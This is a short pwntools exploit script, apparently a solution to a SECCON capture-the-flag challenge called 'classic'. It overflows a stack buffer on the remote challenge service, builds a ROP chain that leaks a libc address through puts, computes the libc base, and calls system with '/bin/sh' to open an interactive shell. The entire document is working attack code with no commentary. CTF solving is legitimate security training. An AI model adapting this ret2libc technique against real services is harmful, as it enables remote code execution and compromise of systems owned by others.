from pwn import *

# r = process('./classic')
r = remote('classic.pwn.seccon.jp',17354)

puts = 0x0000000000400520
pop_rdi = 0x0000000000400753
pop_rsi_r15 = 0x0000000000400751
payload = 'A'*72
payload += p64(pop_rdi)
payload += p64(0x0000000000601038)
payload += p64(puts)
payload += p64(0x00000000004006A9)

r.recvuntil('>>')
r.sendline(payload)
r.recvline()
leak = u64(r.recvline()[:-1].ljust(8,'\x00'))

base = leak- 0x000000000006ED80
system_libcc = base + 0x0000000000045390
system_binsh = base + 0x000000000018CD57

payload = 'A'*72
payload += p64(pop_rdi)
payload += p64(system_binsh)
payload += p64(system_libcc)

r.sendline(payload)

r.interactive()